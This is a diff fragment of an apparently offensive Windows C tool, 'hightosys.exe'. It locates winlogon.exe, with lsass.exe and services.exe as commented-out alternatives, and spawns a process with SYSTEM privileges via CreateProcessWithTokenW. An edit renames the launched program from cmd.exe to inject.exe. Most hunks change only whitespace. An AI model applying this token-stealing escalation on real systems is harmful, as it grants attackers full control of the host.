@@ -145,7 +145,7 @@ DWORD FindSystemProcess() {
         if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0)
             //_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0)
             //_wcsicmp(pe32.szExeFile, L"services.exe") == 0) 
-            {
+        {
             systemPID = pe32.th32ProcessID;
             break;
         }
@@ -161,7 +161,7 @@ int main() {
     HANDLE hSystemToken = NULL;
     HANDLE hSystemProcess = NULL;
     DWORD dwIntegrityLevel;
-    
+
     hprintf("Start hightosys.exe...\n");
 
     // get hightosystem.exe process token
@@ -176,7 +176,7 @@ int main() {
         CloseHandle(hToken);
         return 1;
     }
-    
+
     if (CheckIntegrityLevel(hToken, &dwIntegrityLevel)) {
         PrintIntegrityLevel(dwIntegrityLevel);
     }
@@ -226,7 +226,7 @@ int main() {
         hprintf("CreateProcessWithTokenW failed (%d)\n", GetLastError());
     }
     else {
-        hprintf("Successfully launched cmd.exe with SYSTEM privileges\n");
+        hprintf("Successfully launched inject.exe with SYSTEM privileges\n");
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
